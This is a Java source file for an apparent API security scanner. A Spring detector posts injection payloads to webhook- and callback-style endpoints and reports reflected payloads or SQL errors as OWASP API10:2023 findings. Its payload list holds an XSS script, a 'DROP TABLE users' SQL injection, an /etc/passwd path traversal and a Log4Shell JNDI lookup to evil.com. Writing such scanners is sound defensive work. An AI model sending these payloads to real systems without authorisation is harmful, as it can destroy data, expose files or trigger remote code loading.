package com.vtb.apisecurity.service.analysis.analyzrs.dynamic.detectors;

import com.vtb.apisecurity.model.Vulnerability;
import com.vtb.apisecurity.service.rate.RateLimiterService;
import lombok.AllArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import org.springframework.stereotype.Component;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.UUID;
import java.util.regex.Pattern;

@Slf4j
@Component
@AllArgsConstructor
public class ThirdPartyConsumptionDetector {

    private final OkHttpClient bankingApiHttpClient;
    private final RateLimiterService rateLimiterService;

    // Malicious payloads to test if third-party data is validated
    private static final List<String> INJECTION_TEST_PAYLOADS = Arrays.asList(
        "<script>alert('XSS')</script>",
        "'; DROP TABLE users; --",
        "../../../etc/passwd",
        "${jndi:ldap://evil.com/a}"
    );
    
    private void logHeaders(Request request, String type) {
        log.debug("[THIRD_PARTY] {} Headers:", type);
        request.headers().forEach(pair -> {
            String headerName = pair.getFirst();
            if ("Authorization".equalsIgnoreCase(headerName)) {
                log.debug("[THIRD_PARTY]   {}: Bearer ***", headerName);
            } else {
                log.debug("[THIRD_PARTY]   {}: {}", headerName, pair.getSecond());
            }
        });
    }
    
    private void logHeaders(Response response, String type) {
        log.debug("[THIRD_PARTY] {} Headers:", type);
        response.headers().forEach(pair -> {
            log.debug("[THIRD_PARTY]   {}: {}", pair.getFirst(), pair.getSecond());
        });
    }
    
    private void logRequest(Request request, String method, String body, String payload) {
        log.info("[THIRD_PARTY] Request: {} {} - Payload: {}", method, request.url(), payload);
        logHeaders(request, "Request");
        if (body != null) {
            String logBody = body.length() > 500 ? body.substring(0, 500) + "... (truncated)" : body;
            log.info("[THIRD_PARTY] Request Body: {}", logBody);
        }
    }
    
    private void logResponse(Response response, String method, String url, String responseBody) {
        log.info("[THIRD_PARTY] Response: {} {} - Status: {}", method, url, response.code());
        logHeaders(response, "Response");
        if (responseBody != null && !responseBody.isEmpty()) {
            String logBody = responseBody.length() > 1000 ? responseBody.substring(0, 1000) + "... (truncated)" : responseBody;
            log.info("[THIRD_PARTY] Response Body: {}", logBody);
        } else {
            log.debug("[THIRD_PARTY] Response Body: (empty)");
        }
    }

    private static final Pattern XSS_PATTERN = Pattern.compile("<script[^>]*>.*?</script>", Pattern.CASE_INSENSITIVE);
    private static final Pattern SQL_ERROR_PATTERN = Pattern.compile(
        "(?i)(sql syntax|mysql|postgresql|sqlite|database error)"
    );

    public List<Vulnerability> test(String path, String method, String baseUrl, String authToken) {
        List<Vulnerability> vulnerabilities = new ArrayList<>();

        // Only test endpoints that might consume third-party data
        String lowerPath = path.toLowerCase();
        if (!lowerPath.contains("webhook") && !lowerPath.contains("callback") &&
            !lowerPath.contains("external") && !lowerPath.contains("integration")) {
            return vulnerabilities;
        }

        try {
            String url = baseUrl + path;

            // Test if endpoint reflects third-party data without sanitization
            for (String payload : INJECTION_TEST_PAYLOADS) {
                Request.Builder requestBuilder = new Request.Builder().url(url);

                if (authToken != null && !authToken.isEmpty()) {
                    requestBuilder.header("Authorization", "Bearer " + authToken);
                }

                // Simulate third-party data in request
                String requestBody = String.format("{\"external_data\": \"%s\", \"third_party_response\": \"%s\"}",
                    payload, payload);
                requestBuilder.post(RequestBody.create(requestBody, MediaType.get("application/json")));

                Request request = requestBuilder.build();
                
                // Логирование запроса
                logRequest(request, method, requestBody, payload);

                try {
                    Response response = rateLimiterService.executeWithRateLimit(
                        request,
                        req -> bankingApiHttpClient.newCall(req).execute()
                    );
                    
                    if (response == null) {
                        log.warn("[THIRD_PARTY] Failed to get response after retries for payload: {}", payload);
                        continue; // Пропускаем этот payload если не удалось получить ответ
                    }
                    
                    try {
                        if (response.body() != null) {
                            String responseBody = response.body().string();
                            
                            // Логирование ответа
                            logResponse(response, method, url, responseBody);

                            // Check if malicious payload is reflected without encoding
                            if (responseBody.contains(payload)) {
                                vulnerabilities.add(Vulnerability.builder()
                                    .id(UUID.randomUUID().toString())
                                    .owaspCategory("API10:2023")
                                    .title("Third-Party Data Not Sanitized")
                                    .description("Endpoint " + path + " processes third-party data without proper " +
                                        "sanitization")
                                    .severity(Vulnerability.Severity.HIGH)
                                    .endpoint(path)
                                    .method(method)
                                    .evidence("Malicious payload from simulated third-party data was reflected in response")
                                    .recommendation("Treat all data from third-party APIs as untrusted input. " +
                                        "Implement proper validation and sanitization. " +
                                        "Use context-appropriate encoding (HTML, JavaScript, SQL)")
                                    .build());
                                break; // Found vulnerability
                            }

                            // Check for SQL errors
                            if (SQL_ERROR_PATTERN.matcher(responseBody).find()) {
                                vulnerabilities.add(Vulnerability.builder()
                                    .id(UUID.randomUUID().toString())
                                    .owaspCategory("API10:2023")
                                    .title("SQL Injection via Third-Party Data")
                                    .description("Endpoint " + path + " is vulnerable to SQL injection through " +
                                        "third-party data")
                                    .severity(Vulnerability.Severity.CRITICAL)
                                    .endpoint(path)
                                    .method(method)
                                    .evidence("SQL error when processing simulated third-party data")
                                    .recommendation("Use parameterized queries for all third-party data. " +
                                        "Never concatenate third-party input into SQL queries")
                                    .build());
                                break;
                            }
                        }
                    } finally {
                        response.close();
                    }
                } catch (IOException e) {
                    log.error("[THIRD_PARTY] Error testing third-party consumption for {}: {}", path, e.getMessage(), e);
                }
            }
        } catch (Exception e) {
            log.error("Error in third-party consumption detection for {}: {}", path, e.getMessage(), e);
        }

        return vulnerabilities;
    }
}

